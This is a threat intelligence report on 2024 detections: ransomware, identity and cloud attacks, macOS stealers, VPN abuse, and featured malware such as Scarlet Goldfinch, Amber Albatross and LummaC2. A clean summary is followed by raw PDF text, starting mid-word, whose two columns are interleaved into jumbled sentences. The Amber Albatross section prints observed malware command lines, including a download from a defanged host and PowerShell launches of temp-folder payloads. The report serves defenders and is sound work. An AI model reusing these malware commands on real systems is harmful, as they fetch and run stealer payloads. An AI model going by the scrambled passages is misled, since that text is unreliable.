# 2025 Threat Detection Report

## Table of Contents
- [Introduction](#introduction)
- [Methodology](#methodology)
- [Trends](#trends)
- [Ransomware](#ransomware)
- [Initial access tradecraft](#initial-access-tradecraft)
- [Identity attacks](#identity-attacks)
- [Vulnerabilities](#vulnerabilities)
- [Stealers](#stealers)
- [Insider threats](#insider-threats)
- [VPN abuse](#vpn-abuse)
- [Cloud attacks](#cloud-attacks)
- [Mac malware](#mac-malware)
- [Top threats](#top-threats)
- [Featured threat: Scarlet Goldfinch](#featured-threat-scarlet-goldfinch)
- [Featured threat: Amber Albatross](#featured-threat-amber-albatross)
- [Featured threat: LummaC2](#featured-threat-lummac2)
- [Featured threat: NetSupport Manager](#featured-threat-netsupport-manager)
- [Featured threat: HijackLoader](#featured-threat-hijackloader)
- [Field Guide to Color Bird Threats](#field-guide-to-color-bird-threats)
- [Top techniques](#top-techniques)
- [Featured technique: Email Hiding Rules](#featured-technique-email-hiding-rules)
- [Featured technique: Mshta](#featured-technique-mshta)
- [Featured technique: Cloud Service Hijacking](#featured-technique-cloud-service-hijacking)
- [Acknowledgements](#acknowledgements)

---

## Introduction
We are pleased to present Red Canary’s 2025 Threat Detection Report. Our seventh annual retrospective is based on in-depth analysis of nearly 93,000 threats detected across our customers’ over 4 million identities, endpoints, and cloud resources over the past year. This report provides you with a comprehensive view of this threat landscape, including new twists on existing adversary techniques, and the trends that our team has observed as adversaries continue to organize, commoditize, and ratchet up their cybercrime operations.

As the technology that we rely on to conduct business continues to evolve, so do the threats that we face. Here are some of our key findings:

- **More data**: Red Canary detected nearly 93,000 threats in 2024, increasing last year’s total by more than a third. This is the result of not only more customers, but also our expanded visibility into cloud and identity infrastructure.
- **Trickier browser lures**: The use of fake CAPTCHA lures, a technique known as “paste and run,” likely explains how LummaC2, NetSupport Manager, and HijackLoader made their way into our top 10 threats, as well as Mshta’s return to the top 10 technique list after a four-year absence.
- **Expanded attack surface**: Three of the top 5 MITRE ATT&CK® techniques we detected this year were cloud-native and enabled by identity, including our number one, Cloud Accounts.
- **Proxies are a common thread**: VPN abuse is both rampant and hard to detect, and we observed these popular products leveraged in incidents ranging from ransomware to insider threats.
- **On the rise**: Along with 4x times as many identity attacks as last year, we observed notable increases in infostealers, macOS threats, and business email compromise.

## Methodology
Behind the data, the Threat Detection Report sets itself apart from other annual reports with its unique data and insights derived from a combination of expansive detection coverage, diverse technological partnerships, and expert-led investigation and confirmation of threats. 

### By the Numbers
Red Canary ingested 308 petabytes of security telemetry from our 1,400 customers’ endpoints, identities, clouds, and SaaS applications in 2024. Our detection engine generated 30 million investigative leads that our platform pared down to nearly 93,000 confirmed threats.

![Chart showing that more than a quarter of the threats Red Canary detected in 2024 were high severity.]

## Trends
Red Canary performed an analysis of emerging and significant trends that we’ve encountered in confirmed threats, intelligence reporting, and elsewhere over the past year.

### Ransomware
Ransomware continues to surge year-over-year, and payout demands are only getting higher. As in previous years, Red Canary’s visibility into the ransomware landscape focused on the early stages of the ransomware intrusion chain—the initial access, reconnaissance, lateral movement, and command and control (C2) occurring before exfiltration or encryption.

![Diagram of the Ransomware intrusion chain: Initial access -> Recon -> Lateral movement -> Exfiltration -> Encryption]

### Initial access tradecraft
In 2024, adversaries used a wide range of methods to access and mislead unsuspecting victims. Users had to contend with malicious links and phishes presented in a multitude of ways, including via email, search engines, Microsoft Teams messages, and phone calls. “Paste and run,” a technique used to fool users into running malicious code, grew in popularity in the second half of the year.

### Identity attacks
Thanks to new partnerships and technology, Red Canary detected four times as many identity threats in 2024 than the year before. A working username and password (or an access token of some kind) have long been an adversary’s best option for accessing accounts and systems.

### Vulnerabilities
In 2024, Red Canary tracked vulnerabilities in software such as Fortinet FortiClient EMS, ScreenConnect, and various VPN products. Software vulnerabilities continually rank among the top vectors leveraged by adversaries for initial access in particular.

### Stealers
There is no better way to compromise identities en masse than deploying info-stealing malware. In 2024, stealer malware infections increased across Windows and macOS platforms. Many variants evolved their tradecraft, with some adapting to a growing population of macOS systems while others adapted to technological changes in the browser landscape on Windows systems.

### Insider threats
North Korean insider threats made headlines in 2024, prompting organizations to apply greater scrutiny to both their threat detection and their hiring practices. The report detailed an initiative purportedly organized by the Democratic People’s Republic of Korea (DPRK) that was intended to circumvent sanctions and generate revenue for the country by tricking organizations into unwittingly hiring North Korean workers posing as individuals from other countries.

---
*Note: This document is a summary of the 2025 Threat Detection Report. For full technical details, mitigation strategies, and atomic tests, please refer to the official Red Canary website.*

---

atforms like Google Workspace or
Microsoft O365 data.

2025 THREAT DETECTION REPORT 29
Take action
Ultimately, the problem of unwittingly hiring VPN abuse
imposter employees is just that: A hiring problem.
Detecting VPN abuse can be a little trickier.
As such, the best ways to prevent this from
For one, network-based indicators for VPNs may
occurring are to implement vigorous methods
change periodically and have a limited shelf life.
of accurately validating the identities of
While some VPNs have an agent that you can
job applicants.
potentially detect at installation (or block via some
kind of application block-list solution), this isn’t
Detection always the case. Many identity providers generate
alerts based on suspicious IP ranges or VPN use,
Beyond very specific indicators of compromise and these alerts may uncover VPN abuse, but they
listed in Mandiant’s report, the best way to detect can also be noisy and difficult to investigate.
this variety of insider threat is to develop policies
regulating the kinds of VPNs, remote management Similarly, many identity providers will generate
and monitoring (RMM) tools, and potentially raw logs or telemetry that you can investigate
unwanted programs that are allowed in your or use to develop custom detection analytics.
environment. From there, it’s simply a matter of However, doing so to combat VPN use may require
developing detection coverage for the things leveraging the logs in tandem with some kind of IP
that aren’t allowed. reputation score tool.
For more technical details and guidance,
RMM abuse see the VPN abuse trend page.
Detecting RMM tools is a little tricky since they are
something of a moving target. There are dozens
of RMM tools out there that are readily available
to adversaries, some of them open source and
easily modified to evade detection. Application
block-listing solutions can offer robust protections
against RMM tools, but they can also be difficult
to implement and enforce at scale.
We’ve written extensively about how to detect
RMM abuse in the past, including detection
guidance for numerous popular RMM tools. We
also developed and maintain a free and open
source baselining tool called Surveyor, which
includes definition files for dozens of popular
remote access tools. You can use Surveyor in
an environment with a supported EDR to find
the presence of unexpected RMM tools.

2025 THREAT DETECTION REPORT 30
TRENDS
VPN abuse
Adversaries consistently abuse virtual private networks when
attempting to compromise identities, but distinguishing this
behavior from authorized employee use is not so simple.
Virtual private networks (VPN) allow adversaries VPN abuse in 2024
to conceal the origin of their IP space, often in an
attempt to make it appear as if they are logging
Across our dataset of confirmed threat detections
into an account from an expected location. This
targeting email systems, adversaries most
allows them to circumvent network and identity-
commonly abused the following VPN products:
based controls that would otherwise block login
attempts from unusual internet service or
• Private Internet Access VPN
hosting providers, IP ranges, and geolocations.
• CyberGhost VPN
• ExpressVPN
Likewise, in theory, the use of a VPN should be an
• NordVPN
equally obvious signal that a login is suspicious.
Fortunately for defenders, many identity providers
We chose to limit our analysis to email threats for
and other widely available resources help security
convenience sake, but these are very likely among
teams surface VPN use. Unfortunately, our data
the top VPNs that adversaries are abusing in
shows that legitimate users also frequently log into
intrusions across identities, endpoints, the cloud,
corporate assets from behind a VPN, intentionally
and other SaaS applications. The reason for that
or not.
is simple: These are also among the most popular
consumer VPNs on the market and in use across
our customers.
Interestingly, when we surveyed our data set for
VPN usage generally (i.e., not limited to VPNs we
associated with confirmed threat detections),
organizations in the educational services sector
accounted for 63 percent of all VPN use. This
is despite the fact that organizations in the
educational services sector make up a relatively
small fraction of our overall customer base.
Educational institutions accounted for more than
60 percent of all VPN use observed in our dataset.

2025 THREAT DETECTION REPORT 31
Take action
Visit the VPN abuse trend page for detection and blocklisting to restrict access to untrusted IP
opportunities and relevant atomic tests to ranges while using up-to-date threat intelligence
validate your coverage. feeds to block known consumer VPN services.
Network-level controls, such as DNS filtering,
Ultimately, organizations’ approaches to VPN can further prevent users from installing or
use vary widely. As is the case with potentially connecting to unauthorized VPN services.
unwanted programs (PUP), some companies
care deeply about them, want to know who’s using A robust device-trust model, enforced through
them, and take measures to prevent their use. identity and access management (IAM) or mobile
Others do not care whatsoever and make no device management (MDM) solutions, ensures
effort to limit their use. that only compliant, corporate-managed devices
can access sensitive resources. Conditional
Our official stance as security practitioners is that access policies (CAP) can require additional
organizations should attempt to limit unsanctioned authentication checks when VPN usage is
VPN usage in their environment so that VPN abuse detected or block access entirely based on risk
is rare and therefore a potentially useful signal for signals. These tools can be used to manage
identifying suspicious logons and other activity. browser extensions and prevent the installation
of freemium VPN services from sources like the
Chrome Web Store.
Prevention and mitigation
Lastly, deploying phishing-resistant authentication
Establishing policies and employee awareness mechanisms like FIDO2 or WebAuthn adds an
extra layer of protection against credential
Minimizing the illegitimate use of VPNs in
compromises originating from VPN egress
corporate environments starts with clear
points. By combining these network, endpoint,
and enforceable policies. Organizations should
and identity-based controls, organizations can
explicitly outline acceptable use cases, prohibit
significantly reduce unauthorized VPN usage
personal or unauthorized VPNs, and provide
while maintaining secure remote access for
secure, corporate-approved alternatives such
legitimate users.
as zero-trust remote access or corporate
VPN solutions.
Behavioral baselines and detection
Employee education is equally important, as it Detecting and mitigating VPN abuse requires
helps employees understand the risks associated building robust behavioral baselines at both the
with personal VPN use, including how it can corporate and user/systems level. Security teams
obscure malicious activity and compromise the should monitor typical access patterns—including
organization’s security. Awareness programs locations, IP addresses, internet service providers,
should highlight safe access practices and and access times—to identify deviations that
emphasize the importance of adhering to may indicate malicious activity. Workflows should
corporate policies. include fingerprinting VPN usage by analyzing
known VPN IP ranges, user-agent properties,
Implementing technical controls and unusual access behaviors like frequent IP
hopping, connections from high-risk geographies,
To prevent and mitigate VPN abuse, organizations
or hosting providers commonly associated
should implement a multi-layered technical control
with adversaries.
strategy that integrates network, endpoint, and
identity-based protections. This starts with IP and
Autonomous System Number (ASN) allowlisting

2025 THREAT DETECTION REPORT 32
TRENDS
Cloud attacks
While we saw a general rise in cloud attacks in 2024, the
techniques adversaries employ have largely stayed the same.
Cloud technology continues to expand. Over the Surveying the skies
last few years, most companies have moved their
infrastructure and business operations to the
Before we can fully get into what the cloud threat
cloud: either partially or entirely. In 2024 we have
landscape looks like, we need to understand a few
seen those numbers continue to grow. Gartner
key points. First, cloud technologies depend heavily
forecasts that IT spending on public cloud services
on identity. For more information on how identities
will exceed $1 trillion in 2027, adding that “by 2028,
are compromised, see the Identity attacks
cloud computing will shift from being a technology
section of this report. As identity technology is
disruptor to becoming a necessary component for
heavily intertwined with cloud technologies, most
maintaining business competitiveness….”
cloud attacks begin with a compromised identity.
The cloud is here to stay, cementing itself as a core
Second, many cloud attack techniques are enabled
function of business operations for the foreseeable
by a misconfiguration by a well-meaning developer,
future. This trend has only been accelerated by the
security engineer, or IT administrator. It can be very
recent interest in artificial intelligence (AI), as
difficult to distinguish between “normal” behavior
many businesses are leaning on cloud providers to
of a legitimate user and an adversary trying to
power their AI business services and operations.
perform some operation in an environment. Thus,
it is important to monitor for anomalous behavior
Adversaries are well aware of this movement.
and configuration changes in your environment as
In recent years, they have shifted much of their
it could indicate the presence of a malicious actor.
efforts to attacking and compromising cloud
infrastructure, a trend we have observed directly.
Third and last of all, each major cloud provider
In this section we will cover the current threat
may have slight variations in what techniques
landscape for the cloud and how you can ensure
show up most frequently. We’ll highlight and
you are employing effective strategies to protect
generalize the most common patterns of behavior
your business.
that apply across cloud providers to help paint
a broad picture of what the current cloud threat
landscape looks like.
What we saw in 2024
Most cloud
Throughout the year Red Canary continued
attacks begin with a
to ramp up our cloud detection capabilities.
compromised identity. We support cloud detection for Amazon Web
Services (AWS), Azure, and Google Cloud
Platform (GCP). We also have detection
capabilities for related areas such as identity
and business email compromise (BEC).

2025 THREAT DETECTION REPORT 33
After looking over threats we published and Disabling or modifying firewall rules
research from others, we have seen only minor
Adversaries attempt to access cloud environments
changes in how adversaries are attacking
to take advantage of the services that are running
cloud environments.
inside them. This can allow them to set up a Secure
Shell (SSH) into a compute instance or Remote
To start, let’s consider how adversaries gain
Desktop Protocol (RDP) into a virtual machine.
access to cloud environments. Three of the most
They may also gain access to internal applications
common ways they do this are:
hosted in the cloud environment. Having direct
network access to certain services allows the
• misconfigurations
adversary to maintain access to the environment
• credential theft
even if they lose access to the compromised
• application errors
account they used for initial access.
This seems to indicate that when configured
Disabling or modifying logging
and managed correctly, the authentication
mechanisms provided by cloud service providers Our ability to detect adversary behavior in a cloud
(CSP) provide good security. Along with environment depends heavily on our ability to
identifying misconfigurations or bugs, adversaries review audit logs generated by the cloud provider.
have also gone after the human element by Knowing this, adversaries attempt to disrupt the
attempting to get credentials from a user or ability to view or receive these logs. This would
finding exposed credentials elsewhere. Once allow them to operate in the cloud environment
an adversary has access to an environment, virtually undetected.
there are myriad techniques they can employ to
perform reconnaissance, gather sensitive data,
compromise more privileged accounts, and more. Account Manipulation (T1098)
We’ll identify the most prolific threats we have Adversaries are constantly looking for ways to
seen once an adversary has some level of access gain more privileges, often by compromising an
to a cloud environment and highlight some identity and then attempting to grant more roles
emerging trends. to the identity. This then allows them to potentially
expand their operations to other services or even
completely take over a cloud environment.
Cloud attack
techniques If an organization has granted its users overly
permissive roles, adversaries can escalate
privileges with just one set of compromised
In general we saw a rise in cloud-related threat
credentials. Each major cloud provider has
actor activity in 2024. The techniques employed,
different defaults for assigning privileges to
however, did not change substantially. Let’s focus
identities. The identities may be human users or
on a few high-level MITRE ATT&CK techniques
they could be service accounts that are tied to
seen across all the major cloud providers.
a specific service, such as Kubernetes, virtual
machines, serverless functions, etc.
Impair Defenses (T1562)
Credential Theft (TA0006)
Across our customer base we saw a clear trend
of adversaries attempting to impair defenses
While a stolen username and password can
inside of a cloud environment. The two most
grant an adversary access to a victim’s cloud
common approaches we observed were disabling
environment, credentials such as API keys,
or modifying firewall rules and disabling or
certificates, and various tokens enable the
modifying logging in the cloud environment.
adversary to maintain that access over a longer
period of time.

2025 THREAT DETECTION REPORT 34
Common ways adversaries steal AI enters the cloud
credentials include:
Many of the major cloud service providers (CSPs)
• finding publicly exposed credentials
offer artificial intelligence (AI) services as part of
• using adversary-in-the-middle technologies
their suite of products, and adversaries have taken
such as Evilginx
notice. If an adversary is able to gain access to AI
• phishing users for their login credentials
models or their access tokens, they can perform a
• leveraging stealer malware
wide variety of actions, including:
Regardless of how the adversaries gain access
• incurring high costs through malicious
to the credentials, the end goal is the same: They
token usage
want to gain access to a cloud environment as a
• reputational damage through the submission
legitimate user. They can then leverage that access
of illicit, illegal, or otherwise unwanted content
to understand the user’s permissions and what
• theft of intellectual property
tradecraft they can execute as that user.
For more examples of how an adversary
might abuse AI in the cloud, read our blog
Understanding and observing Azure OpenAI
abuse and visit the Cloud Service Hijacking
section of this report.
We’re confident that this trend will continue
throughout the next few years as both
businesses and adversaries take more
advantage of AI services.
Read our two-part blog
series on how we find
cloud threats in the
haystack of 6 million
telemetry records we
process every day.
Read the blog

2025 THREAT DETECTION REPORT 35
Take action
Visit the Cloud attacks trend page for detection When applied correctly, these best practices make
opportunities and relevant atomic tests to validate it very difficult for adversaries to take control of
your coverage. your cloud environment. You will need to ensure
that all users with access to a cloud environment
Understanding the latest trends in cloud security are aware of the risks and know how to properly
is an important first step to developing an effective protect their accounts and the services to which
mitigation strategy. The next step is understanding they have access.
what you can do to defend your environments
against these types of attacks. Let’s explore Next, you’ll need to secure the human element.
some strategies. Human error accounts for an overwhelming
majority of cloud breaches. This may be due to
a user providing credentials during a phishing
Best practices for cloud security
attack, or a developer accidentally exposing
API keys. Whatever the case, ensure that all
Cloud systems are reasonably secure, when reasonable efforts have been made to protect
configured correctly. We’ve written about the people from adversaries and from themselves.
benefits that cloud security offers over
endpoint security. That said, cloud security Here are some recommendations and best
is only as good as its configuration. According practices:
to Gartner, 80 percent of data breaches can be
attributed to a misconfiguration, and almost all 1. Ensure all users have strong MFA enabled
cloud environment failures can be attributed to 2. Use short-lived tokens whenever possible
some human error. 3. Use identity federation when
possible/applicable
It seems the problem is not the cloud technology 4. Make sure users are educated on how to
itself but rather our understanding of how to spot phishing attempts
properly secure cloud applications. So what can 5. Narrowly scope users’ roles inside of a
we do about it? cloud environment
6. Keep services private unless
For starters, make sure your users are properly absolutely necessary
educated on the best practices recommended by 7. Use limits and quotas to reduce the potential
the various CSPs: cost impact of adversary behavior
• AWS For more in-depth guidance on how to
• Azure protect your environment from these risks,
• GCP check out this Cloud Security Alliance article
on managing misconfiguration risks.

2025 THREAT DETECTION REPORT 36
TRENDS
Mac malware
macOS stealers ran rampant throughout most of 2024, until
Apple remediated Gatekeeper bypassing with the release of
macOS Sequoia.
macOS threats in 2024
In most years, macOS threats vary from their
Windows counterparts for a variety of reasons,
ranging from differences in operating system Although stealers have targeted macOS prior to
architecture, software support, relative market 2024, this year showed a large proliferation of
share, and more. In 2024, macOS experienced multiple stealer families targeting the platform.
the same phenomenon that Windows did: an During the year, we observed Atomic, Poseidon,
exponential increase in stealer malware. Stealers and Banshee stealers targeting macOS systems,
on macOS targeted cryptocurrency data, files on with each family sharing some properties and
disk, and credentials in web browsers and user diverging in small ways.
keychains—taking large amounts of data from
victim systems. In terms of initial access, each of these families
followed a well-tread pattern for most of the year.
A victim encountered the malware by downloading
it under the guise of free or cracked software or
through a malicious advertisement. The user
would download a disk image (DMG) file for
Red Canary observed
macOS containing the malware inside. Once
four times as many mounted, the user would encounter a dialog
instructing them to right click on the downloaded
macOS threats in 2024
software and click “Open.”
than in 2023.
The key difference in macOS threats from 2023 to
2024 was volume. Red Canary’s overall detection
volume for macOS threats is relatively low,
primarily because macOS devices represent a
relatively small fraction of the endpoint devices we
protect. Even so, we saw a 400 percent increase
in macOS threats from 2023 to 2024, driven in
large part by stealer threats like Atomic, Poseidon,
Banshee, and Cuckoo stealers. Importantly, these
threats were most active early in the year up until
around the end of summer and then tapered off Image courtesy of Moonlock Labs
significantly toward the last few months of the
year, a trend we’ll dive into below.

2025 THREAT DETECTION REPORT 37
This dialog box surreptitiously instructed the The adversary’s goal here is two-fold: to obtain
user to bypass macOS Gatekeeper controls—a the password itself and to use sudo commands
safety measure in macOS platforms to restrict in case they need to access additional sensitive
the system into only executing signed code. We data that requires elevated access. Once the
covered this technique extensively in the 2023 victim enters their password, a multitude of file-
Threat Detection Report. At the time Gatekeeper gathering activities occur. These actions may vary
could be bypassed for unsigned software by right- slightly between different stealer versions, but they
clicking on the unsigned software and instructing commonly target:
it to open. In September 2024, Apple removed
the ability to bypass Gatekeeper in this manner • macOS keychain files
in macOS Sequoia, likely explaining the drop in • browser credentials in Google Chrome, Mozilla
detections we saw toward the end of the year. Firefox, Vivaldi, Brave, and others
• cookies in Safari
Once executed, the stealer would prompt the • Apple Notes databases , , ,
txt pdf docx
user for their password, mostly using AppleScript , , , and files in user’s
wallet key keys doc
processes. Although the specific message often and folders
Desktop Documents
changed between stealer versions, it always either • cryptocurrency wallets and browser extensions
explicitly asked for password entry or implied the • Telegram desktop data
need to supply a password for a system change.
During the stealer execution, message boxes
for macOS Transparency, Consent, and Control
(TCC) would pop up asking to access sensitive
data. From the number of stealers we observed
in the year, we can assert that the TCC messages
did precious little to stop the data theft as users
clicked past them.
Images from sandbox executions
Once the data was gathered into a staging folder
on disk, the stealers would compress it into a ZIP
archive using a command. Then, the ZIP
ditto
archive would be exfiltrated to an adversary-
controlled system over HTTP. Depending on the
stealer family, this exfiltration may use
curl
commands to upload or it may be implemented in
Images from sandbox executions Objective-C or Swift code in the malware.

2025 THREAT DETECTION REPORT 38
Apple takes action
In macOS Sequoia, Apple removed the Gatekeeper
bypass commonly used by multiple stealer families
95 percent of the year’s
for execution. This had a marked impact in the
stealer detections arrived
number of stealer executions we observed, with
95 percent of stealer infections happening prior to before September 2024.
September and just 5 percent occurring after.
Starting in September, the number of macOS
stealer detections tapered off with only
occasional encounters.
In the malware sample shown, the adversary
This feature change also caused adversaries to
decided to distribute their initial payload as a shell
experiment with different ways to distribute their
script within a DMG file, coaching the user through
malware, as seen in this tweet by DefSecSentinel:
dragging it on top of a Terminal icon to launch it.
With this approach, Gatekeeper doesn’t stand in
the way of malware execution.
With Gatekeeper bypasses off the menu in new
macOS builds, adversaries now have to try
harder to distribute their malware. This trend has
continued into 2025 as some adversaries have
tried to distribute stealers masquerading as the
Homebrew tool for macOS, or even as “video
interview” material.
Take action
Visit the Mac malware trend page and the the free Mac Monitor. The mitigations here are
Stealers trend page for detection opportunities the same for any other stealer families, providing
and relevant atomic tests to validate your safe software sources and a robust response plan.
coverage. For macOS-specific actions, consider further
educating users on TCC controls in macOS and
macOS devices should have comprehensive presenting scenarios when users may not want
protections in place, including: to bypass TCC to preserve their own security
and privacy.
• antivirus
• anti-malware controls For endpoints where a stealer has run, consider
• endpoint detection and response (EDR) resetting all TCC permissions so they will re-fire
in the future even if a user approves access
Without visibility, detection and response are by executing:
much more difficult. To explore what telemetry
data is possible to gather, consider checking out
sudo tccutil reset All

2025 THREAT DETECTION REPORT 39
TOP THREATS
The following chart illustrates the specific threats What’s included in this section
Red Canary detected most frequently across
our customer environments in 2024. We ranked This PDF spotlights the five threats making their
these threats by the percentage of customer debuts in the Threat Detection Report, covering
organizations affected to prevent a single, analysis of relevant, novel, or changing threat
major security event from skewing the metrics. tradecraft and advice for mitigating the effects
We excluded threat detections associated with of the threat. You can view the full analysis of all of
customer-confirmed testing. the top 10 threats—including detection and testing
guidance—in the web version of this report.
As discussed in our Methodology section, we
chose to define “threats” broadly as malware,
tools, threat groups, or activity clusters—in short, In addition to the top 10, read our
any suspicious or malicious activity that represents field guide to the other threat clusters
a risk to you or your organization. that our Intelligence team is tracking.
TOP 10 THREATS DETECTED IN 2024
1. SocGholish 6. LummaC2
4.9% of customers affected 2.8%
2. Impacket 7. NetSupport Manager
4.4% 2.7%
3. Scarlet Goldfinch 8. Gootloader
3.4% 2.4%
4. Mimikatz 9. Gamarue
3.2% 2.4%
5. Amber Albatross 10. HijackLoader
2.9% 1.8%

2025 THREAT DETECTION REPORT 40
FEATURED THREAT
#3 OVERALL
RANK
Scarlet Goldfinch
3.4% CUSTOMERS
Closely mimicking SocGholish, this fake update
AFFECTED
variant propelled its primary payload, NetSupport
Manager, into prominence as well.
Analysis
NetSupport Manager, providing persistent remote
access to the adversary.
Scarlet Goldfinch is Red Canary’s name for a
Scarlet Goldfinch leverages web injects on
fake browser update activity cluster, similar to
compromised legitimate websites to redirect users
SocGholish, that first emerged in June 2023.
to their fake update download sites. This approach
One of several emerging threats in mid-2023
leads to a somewhat diverse and indiscriminate
that followed SocGholish’s fake update footsteps,
pool of victims, and we have not observed any
Scarlet Goldfinch is tracked by other researchers
patterns in targeting by Scarlet Goldfinch.
under several different names, including
Left unchecked, we have observed additional
SmartApeSG (due to early observations of C2
follow-on payloads delivered after NetSupport,
infrastructure hosted on SmartApe ASN) and ZPHP
(due to the use of PHP files to host C2 payloads).
such as LummaC2.
Like SocGholish, Scarlet Goldfinch leverages
Tracking changes in lure names
Watch our video on the difference between
At a high level, Scarlet Goldfinch’s objectives have
Scarlet Goldfinch and SocGholish.
remained consistent from when we first observed it
in mid-2023. The use of fake update lures to entice
compromised websites to present unsuspecting a user to run a malicious JS dropper to download
visitors with a notification that they need to and install NetSupport has remained consistent.
update their browser. Those who take the However, at the procedure level, Scarlet Goldfinch
bait will download a malicious JavaScript (JS) demonstrated several changes throughout 2024,
file that typically attempts to install indicating ongoing active development.
SCARLET GOLDFINCH TIMELINE
August 2024
Scarlet Goldfinch drops the u se
December 2023
of a ZIP file as the initial download,
Scarlet Goldfinch introduces
random numbers to vary install March 2024 replacing it with a direct download
folders and the filenames The name of the run key of a file n amed Update.js . This
used for the ZIP file containing used for persistence changes is s imilar to a change made by
NetSupport. to a new value. SocGholish in late 2022.
February 2024 May 2024 December 2024
The ZIP and JS lure names Both the key and Scarlet Goldfinch shifts away
run
change from including the date installation folders change to from the lure,
Update.js
and a random number to a lure randomized strings that change adding a random 4-5 digit string
that matches the latest Chrome for e very install. to make each filename unique,
release version number. for example .
Update.1234.js

2025 THREAT DETECTION REPORT 41
Ditching PowerShell Then, in November 2024, the PowerShell
component disappeared from the infection chain.
While these changes in lure names indicate Instead, the adversaries beefed up the code in the
continued minor tinkering with Scarlet Goldfinch, JS file. The tactics and higher-level techniques
the biggest change we observed showed up in remained the same–pull down a ZIP containing
mid-November 2024. For about 15 months prior NetSupport, write it to a folder, and establish run
to that, Scarlet Goldfinch had used PowerShell key persistence–but the procedures for doing this
code as the second-stage downloader to deploy now existed entirely within the initial JavaScript
NetSupport onto the system. Spawned by the dropper. While this change not only represents
process, PowerShell would reach out to active code development, it also impacts
wscript
a C2 domain to pull down a ZIP file containing detection strategies.
the NetSupport binary, unzip the
client32.exe
contents to a folder in , execute it, But as often happens, when one door closes
%AppData%
and modify the key in another one opens. Scarlet Goldfinch no longer
CurrentVersion\Run
the Windows registry to establish logon triggers the subset of PowerShell detection logic
persistence. This PowerShell code saw minor it once did, but we’re now seeing new activity
changes over time, similar to the filename lures, from some of our other detection logic.
adding increased obfuscation through variables
and modifying the installation folder and run
key names. But the basic functionality
remained unchanged.
Take action
Visit the Scarlet Goldfinch threat page for
detection opportunities and relevant atomic
tests to validate your coverage.
One of the best ways to mitigate risks associated
with Scarlet Goldfinch–as well as SocGholish,
Gootloader, and other threats that begin with
malicious JavaScript files–is to change the
default behavior in Windows to open JS files
with notepad or another editor rather than
immediately executing them. Details on
implementing this control via Group Policy
Objects (GPO) are available in our May 2024
blog Open with Notepad: Protecting users
from malicious JavaScript.
Watch our video on using Notepad to
prevent cyber attacks.

2025 THREAT DETECTION REPORT 42
FEATURED THREAT
#5 OVERALL
Amber Albatross RANK
2.9% CUSTOMERS
Amber Albatross arrived on the scene in 2024.
AFFECTED
While it is delivered via PUP, it behaves like a wolf.
Analysis LET’S COMPRESS
Amber Albatross is a Red Canary-named activity LetsCompress.msi
cluster that we have been tracking since January
Executes
2024. The activity encompasses download and
installation activities that consistently lead to a
upd.exe
Pyarmor-obfuscated PyInstaller executable with
stealer-like capabilities. We have consistently Executes Downloads
observed Amber Albatross installers as a payload
delivered by potentially unwanted programs
Decrypt.exe --safetorun decryptables[.]com/dec
(PUP), including Bit Guardian’s Bit Driver Updater,
-x --channel=1 -a rypt.zip
PC App Store, and Let’s Compress.
The Amber Albatross intrusion chain contains
monitors.exe --safetorun -x --channel=25 -a
multiple stages with anti-analysis techniques
that make sandbox analysis difficult, and the
final payload is heavily obfuscated. We assess powershell.exe “Start-Process -FilePath
that this activity is nefarious due to suspicious %Temp%\320741893527195 -NoNewWindow -ArgumentList
‘--safetorun’,’-x’--channel=1’,’-a’
reconnaissance activity and its heavy obfuscation.
We first reported on Amber Albatross in our
PC APP STORE
July 2024 Intelligence Insights.
Watch our video on Amber Albatross. Setup.EXE
Executes Downloads
Intrusion chain
fx.exe --s<decimal
In 2024, the two most prevalent PUPs we observed digits> --ch=<hex fx.exe
installing Amber Albatross were PC App Store digits> -a
(beginning in June and continuing through the end
of the year), and Let’s Compress (beginning in
November and continuing into 2025). The charts
shown here walk through the installation path used cmd.exe /c powershell.exe “Start-Process
–FilePath %Temp%/201721443921284 -NoNewWindow
to deliver Amber Albatross’ PyInstaller executable
–ArgumentList --s<decimals>’,’--ch=<hex>’,’-a’
for each program.

2025 THREAT DETECTION REPORT 43
The final payload if the browser might be controlled by corporate
policy. We have yet to discern how Amber
Regardless of the initial infection chain, the final Albatross uses this information or continues the
Amber Albatross payload–the PyInstaller file— intrusion chain. However, these reconnaissance
will immediately perform reconnaissance, similar activities are typical for stealers.
to what we typically observe from stealers.
During the reconnaissance phase, the malware
Anti-analysis tactics
will use WMIC to detect if there is a hypervisor
present on the endpoint as well as enumerate
The downloaded Amber Albatross installation and
the manufacturer, model, and list of Windows
PyInstaller files require specific command-line
software updates. The PyInstaller file also checks
parameters in order to fully execute. We have
for antivirus and firewall products, and based on
consistently observed the arguments
analyzing memory dumps looks for a wide range --safetorun
and . The numbers
of browsers and their development versions, --channel=<hex numbers>
included in the flag vary by infection.
including: --channel=
The requirement for command-line arguments
• Edge
has prevented behavioral analysis from showing
• FireFox
the last-stage PyInstaller binary. For example,
• Chrome
the PyInstaller files are rarely found on VirusTotal.
• Chromium
This is because when the C++ file is uploaded to
• Avast Browser
VirusTotal, it does not have arguments passed with
• Brave
it to the sandbox engines.
Once it identifies the browsers utilized on the
Additionally, we do not observe the same behavior
endpoint, the PyInstaller will attempt to access
from the PC App Store installer in sandboxes as
browser profiles or user data folders. For Chrome,
we do in live telemetry. This indicates there is some
we have seen Amber Albatross check the value of
anti-sandbox analysis happening with the initial
the following registry key:
installer, making it difficult to observe the entire
infection chain in a controlled environment.
HKLM:\SOFTWARE\Policies\Google\Chrome\
The final-stage PyInstaller file that performs
CloudManagementEnrollmentToken
the reconnaissance activities is protected by
Pyarmor, which encrypts and obfuscates the
This key is set during enrollment for managed
Python bytecode. This makes static analysis a
browsers, allowing Amber Albatross to determine
challenging and time consuming endeavor.
Take action
Visit the Amber Albatross threat page for
detection opportunities and relevant atomic
tests to validate your coverage.
One of the best ways to prevent threats like Amber
Albatross from executing in your environment is to
restrict third-party app stores like PC App Store.
Red Canary classifies PC App Store as a PUP and
detects it as such. While PUPs are a lower priority
for many teams, restricting their use can prevent
possible credential theft and the leaking
of sensitive company data.

2025 THREAT DETECTION REPORT 44
FEATURED THREAT
#6 OVERALL
LummaC2 RANK
2.8% CUSTOMERS
The most popular infostealer of 2024,
AFFECTED
LummaC2 exemplifies the advantages of
using a malware-as-a-service (MaaS) model.
Analysis
LummaC2 has
LummaC2, also known as LummaC or Lumma
MaaS appeal.
Stealer, is a malware-as-a-service (MaaS)
stealer that has been available for purchase on
underground forums since at least mid-2022.
Subscriptions start at $250 USD per month, all the information, and 2FA tokens, but it has expanded
way up to a one-time payment of $20,000 USD to
beyond its original scope. It remains in active
gain access to Lumma source code. Adversaries
development, and over time has added features
favor the MaaS model because they can launch
including customizable stealer configurations
their operations with relative ease and low
